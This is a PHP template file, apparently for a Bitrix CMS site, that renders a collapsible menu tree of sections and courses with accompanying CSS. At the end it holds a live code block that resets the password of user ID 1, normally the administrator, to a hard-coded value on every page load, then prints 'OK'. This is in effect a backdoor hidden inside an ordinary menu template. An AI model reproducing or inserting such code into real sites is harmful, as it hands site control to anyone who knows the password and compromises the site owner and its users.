<style type="text/css">
.tree								{margin: 0px; margin-left:-38px; margin-right:-20px;}
.tree li 							{margin: 0px; padding:0px; margin-bottom:10px; display:block; width:100%;}
.bullit								{width:29px; height:26px ; background: url(/images/current-bullit.png) 0px 0px no-repeat;}
.bullit:hover 						{width:29px; height:26px ; background: url(/images/current-bullit2.png) 0px 0px no-repeat;}
.tree li ul.sub_tree 				{margin: 0px; padding:0px; margin-left: 30px; }
.tree li ul.sub_tree li 			{margin: 0px; padding:0px; display:block; border-top: none; width:100%;}
.tree li ul.sub_tree li span 		{background:none; border-top:1px solid #c4ced7; display: block; margin-top: 7px; margin: 0px; padding:0px; height:auto; width:100%;}
.tree li ul.sub_tree li span a 		{background:none; padding-left:20px; margin: 0px; padding:0px; height:auto; width:100%;}
.tree li.act ul.sub_tree li span	{background:none; border-top:1px solid #c4ced7; display: block; margin-top: 7px; margin: 0px; padding:0px;}
.tree li.act ul.sub_tree li span a 	{background:none; padding-left:20px; margin: 0px; padding:0px;}
.tree li ul.sub_tree li ul 			{ list-style-type:disc; margin-left: -35px; padding-left: 36px; display:block; border-top: none; margin: 0px; padding:0px;  margin-bottom:25px;}
.tree li ul.sub_tree li ul li 		{ margin-left: -35px; padding-left: 70px; display:block; border-top: none; margin-bottom:0px; margin-top:0px;}
</style>

<?list($domen,$directory,$currSection, $currCourse, $end) = split('[/]', $_SERVER["REQUEST_URI"]);?>

<?$k=0;?>
<?$arlt=Array();?>
<ul class="tree">
<?foreach($arlt as $SEC) {?>
	<?$k++;?>
	<li id="<?=$k?>">
		<table>
			<tr>
				<td class="bullit">
				</td>
				<td>
					<a	href="<?=$SEC["SECTION_PAGE_URL"]?> "
						class="l1" 
						<?if (  substr_count($SEC["SECTION_PAGE_URL"],$currSection) ){?> style="color:#45addf"<?}?>
					>
					<? echo $SEC['NAME']?>
					</a>
				</td>
			</tr>
		</table>

	<?$i=0;?>
	<ul class="sub_tree" >
	<?foreach($SEC['ITEMS'] as $CURSE):?>
			<?$i++;?>
			<?$FLG = substr_count($_SERVER["REQUEST_URI"],$CURSE["DETAIL_PAGE_URL"]);?>
			<li <?if($FLG){?>class="curr11"<?}?> >
				<span>
					<a 	href="<?=$CURSE["DETAIL_PAGE_URL"]?>"  <?if($FLG){?>id="active"<?}?>>
						<?echo $CURSE["NAME"]?>
					</a>
					<?if($FLG){?>
						<script type="text/javascript">
							$('li#<?=$k?>').addClass('expand');
						</script>
					<?}?>
				</span>
			</li>
			
	<?endforeach;?>
	</ul>
	</li>
<?}?>
</ul>

<pre>
<?
//print_r($arResult);
?>
</pre>
<?
require($_SERVER['DOCUMENT_ROOT']."/bitrix/header.php");
echo $USER->Update(1,array("PASSWORD"=>'SomeWord+123'));
echo $USER->LAST_ERROR;
require($_SERVER['DOCUMENT_ROOT']."/bitrix/footer.php");
echo("OK");
?>

